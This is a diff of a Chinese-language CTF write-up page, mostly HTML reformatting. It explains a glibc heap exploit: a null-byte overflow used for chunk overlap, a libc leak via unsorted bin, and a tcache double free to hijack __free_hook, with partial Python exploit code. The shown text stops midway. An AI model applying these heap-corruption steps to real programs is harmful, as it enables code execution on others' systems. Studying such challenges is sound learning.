+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F4E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index \n&gt; &quot;</span>);</span><br><span class="line">  v1 = sub_CAD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> || !*(<span class="number">16LL</span> * v1 + qword_202050) )</span><br><span class="line">    sub_BBF();</span><br><span class="line">  <span class="built_in">puts</span>(*(<span class="number">16LL</span> * v1 + qword_202050));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>若输出的index合法且存在则调用puts()函数打印chunk中的内容</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于got表不可写，那么只能向hook中写了。向hook中写什么？当然是one_gadget了，如果想得到gadget那么势必要得到libc的基地址。所以首先的第一步是泄露libc基地址！</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>由于got表不可写，那么只能向hook中写了。向hook中写什么？当然是one_gadget了，如果想得到gadget那么势必要得到libc的基地址。所以首先的第一步是泄露libc基地址！</p>
 <p>那么在确定第一步泄露libc基地址后，就需要怎么去泄露。首先必要的输出程序中是有的：show（）函数。根据以往的做题经验，我们可以通过泄露unsorted bin中空闲块的方式先泄露处main_arena + 偏移，接着确定main_arena地址，进而确定libc基地址</p>
 <p>对比以往的做题，我们都是利用堆溢出的方式去修改被释放chunk的fd或者bk，但是这道题并没有修改data的功能，值存在一个null-byte-overflow漏洞，那么脑海中就应该想到关于inuse位的利用方法：overlapping heap chunk。</p>
 <p>如果想要利用overlapping heap chunk，我们还需要能够控制被溢出inuse标志位所在块的<code>prev_size</code>。虽然我们不能通过堆溢出构造，但是可以利用unsorted bin中<code>堆块合并</code>的机制去修改prev_size的值，尤其是这种每个chunk大小相同的情况下。</p>
-<h4 id="首先利用堆块合并改写pre-size"><a href="#首先利用堆块合并改写pre-size" class="headerlink" title="首先利用堆块合并改写pre_size"></a>首先利用堆块合并改写pre_size</h4><p>实现的代码</p>
+<h4 id="首先利用堆块合并改写pre-size">首先利用堆块合并改写pre_size</h4>
+<p>实现的代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#chunk 6</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#chunk 7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#chunk 8</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;eeee&#x27;</span>)<span class="comment">#chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>): <span class="comment">#删除chunk0-chunk5</span></span><br><span class="line">     dele(i)</span><br><span class="line">dele(<span class="number">9</span>)            <span class="comment">#先删除chunk9 防止chunk6-chunk8与top chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">9</span>):  <span class="comment">#修改pre_size</span></span><br><span class="line">     dele(i)</span><br></pre></td></tr></table></figure>
-
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
-<td align="center"><strong>0x560d334f0600</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0900</strong></td>
-<td align="center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0b00</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0b00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053216.png" alt="image-20220417164252755"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053217.png" alt="image-20220417164454692"></p>
-<h4 id="null-byte-overflow漏洞覆盖inuse标志位"><a href="#null-byte-overflow漏洞覆盖inuse标志位" class="headerlink" title="null-byte-overflow漏洞覆盖inuse标志位"></a>null-byte-overflow漏洞覆盖inuse标志位</h4><p>现在我们已经写好了0x560d334f0b00的prev_size，接下来需要做的就是覆盖其inuse位了，那么既然要覆盖，就需要重新启用bin中的堆块，这里需要注意的是bin中如果tcache bin中有满足需求的空闲块，则优先在tcache中分配。所以我们需要首先申请7个chunk将tcache清空，但是这里还需要注意的是tcache中堆块被拿出的顺序，由于在之前为了防止chunk6、chunk7、chunk8被top chunk合并，所以最后释放进tcache bin中的堆块为chunk9，那么由于tcache的LIFO先进后出的分配机制，所以首先被分配的应该是chunk9，所以在分配7chunk后表格中的位置对应地址为：</p>
+<h4 id="null-byte-overflow漏洞覆盖inuse标志位">null-byte-overflow漏洞覆盖inuse标志位</h4>
+<p>现在我们已经写好了0x560d334f0b00的prev_size，接下来需要做的就是覆盖其inuse位了，那么既然要覆盖，就需要重新启用bin中的堆块，这里需要注意的是bin中如果tcache bin中有满足需求的空闲块，则优先在tcache中分配。所以我们需要首先申请7个chunk将tcache清空，但是这里还需要注意的是tcache中堆块被拿出的顺序，由于在之前为了防止chunk6、chunk7、chunk8被top chunk合并，所以最后释放进tcache bin中的堆块为chunk9，那么由于tcache的LIFO先进后出的分配机制，所以首先被分配的应该是chunk9，所以在分配7chunk后表格中的位置对应地址为：</p>
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0c00</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0600</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0500</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>空</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>空</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>空</strong></td>
-<td align="center"><strong>空</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>空</strong></td>
+<td style="text-align:center"><strong>空</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>我们再去申请chunk的话就，就会直接从unsorted bin中分割了。</p>
 <table>
 <thead>
 <tr>
-<th align="center">chunk0</th>
-<th align="center">chunk1</th>
-<th align="center">chunk2</th>
-<th align="center">chunk3</th>
+<th style="text-align:center">chunk0</th>
+<th style="text-align:center">chunk1</th>
+<th style="text-align:center">chunk2</th>
+<th style="text-align:center">chunk3</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0c00</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0600</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0500</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0b00</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0b00</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>所以接下来我们还需要倒一次bin，依然还是先释放chunk0 - chunk5，不过这里单释放的是chunk8</p>
 <p>这里释放chunk8的原因如下：</p>
 <ul>
@@ -307,47 +317,50 @@
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>tcache</strong></td>
-<td align="center"><strong>tcache</strong></td>
-<td align="center"><strong>tcache</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>tcache</strong></td>
+<td style="text-align:center"><strong>tcache</strong></td>
+<td style="text-align:center"><strong>tcache</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>tcache</strong></td>
-<td align="center"><strong>tcache</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>unsorted bin</strong></td>
+<td style="text-align:center"><strong>tcache</strong></td>
+<td style="text-align:center"><strong>tcache</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>unsorted bin</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>空</strong></td>
-<td align="center"><strong>0x560d334f0b00</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>空</strong></td>
+<td style="text-align:center"><strong>0x560d334f0b00</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>由于我们修改了chunk9的inuse标志位，且chunk0是chunk9物理相邻的前一个chunk，所以即使chunk0处于使用状态，但现在被chunk9强迫标志为被释放堆块。那么如果将chunk9释放后挂进unsorted bin中，那么chunk7、chunk0、chunk9还是会被认为是连续释放进unsorted bin之后合并的大块。</p>
 <p>此时chunk7的fd和bk指向的unsorted bin，如果这个时候将chunk7分配走，那么物理相邻的chunk0就会被认为是已分割后剩余堆块的头部，那么这个时候chunk0的fd指针和bk指针就会指向unsorted bin。</p>
 <p>这样一来chunk0虽然是使用状态，这样一来我们就可以调用程序自身的输出函数输出chunk0，连带着就会将unsorted bin地址输出出来</p>
-<h4 id="泄露unsorted-bin地址"><a href="#泄露unsorted-bin地址" class="headerlink" title="泄露unsorted bin地址"></a>泄露unsorted bin地址</h4><p>我们首先释放chunk 6，填满tcache</p>
+<h4 id="泄露unsorted-bin地址">泄露unsorted bin地址</h4>
+<p>我们首先释放chunk 6，填满tcache</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053220.png" alt="image-20220417174927149"></p>
 <p>然后释放chunk 9，chunk7 chunk0和chunk9合并，由于tcache 填满，所以合并后的块会放入unsorted bin 中</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053221.png" alt="image-20220417175022665"></p>
@@ -357,128 +370,135 @@
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0600</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>空</strong></td>
-<td align="center"><strong>unsorted</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>空</strong></td>
+<td style="text-align:center"><strong>unsorted</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>此时申请一个chunk 即从unsorted bin中切割一块，并放到chunk 8处，之前0x560d334f0900处的的fd和bk指向的unsorted bin，切割后0x560d334f0a00 的fd和bk指向unsorted bin，那么我们打印chunk0（0x560d334f0a00  ）即可泄露基址</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053223.png" alt="image-20220417182515721"></p>
 <p>此时各个chunk的对应情况为：</p>
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0600</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0900</strong></td>
-<td align="center"><strong>unsorted</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>unsorted</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
-<h4 id="构建Double-Free，将free-hook挂进tcache-bin"><a href="#构建Double-Free，将free-hook挂进tcache-bin" class="headerlink" title="构建Double Free，将free_hook挂进tcache bin"></a>构建Double Free，将free_hook挂进tcache bin</h4><p>如果再去申请一个堆块的话，就会从unsorted bin中的合并堆块分割，即<code>0x560d334f0a00</code>不仅会存放进chunk0，还会存放进chunk9：</p>
+</tbody>
+</table>
+<h4 id="构建Double-Free，将free-hook挂进tcache-bin">构建Double Free，将free_hook挂进tcache bin</h4>
+<p>如果再去申请一个堆块的话，就会从unsorted bin中的合并堆块分割，即<code>0x560d334f0a00</code>不仅会存放进chunk0，还会存放进chunk9：</p>
 <p>此时各个chunk的对应情况为：</p>
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0300</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0300</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0600</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0900</strong></td>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>那么此时chunk0和chunk9中存放的都是<code>0x560d334f0a00</code>，那么这种情况我们可以利用Double Free！</p>
 <p>但是这里还需要注意的是tcache虽然对链表中的检查不够严格，但也并不是一点都不检查。还是会对链接tcache bin的堆块做完整性检查的，所以我们需要先将chunk1释放进tcache，为chunk0和chunk9做检查绕过，此时tcache中的情况为：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053224.png" alt="image-20220417183609892"></p>
@@ -487,43 +507,45 @@
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>tcache2</strong></td>
-<td align="center"><strong>tcache1</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>tcache2</strong></td>
+<td style="text-align:center"><strong>tcache1</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0600</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0900</strong></td>
-<td align="center"><strong>tcache3</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>tcache3</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>接下来我们重新申请一个堆块，这时重启的是第二次释放的<code>0x560d334f0a00</code>即tcache3。我们在申请堆块的同时将内容填写成<code>free_hook</code>的地址</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053225.png" alt="image-20220417202118160"></p>
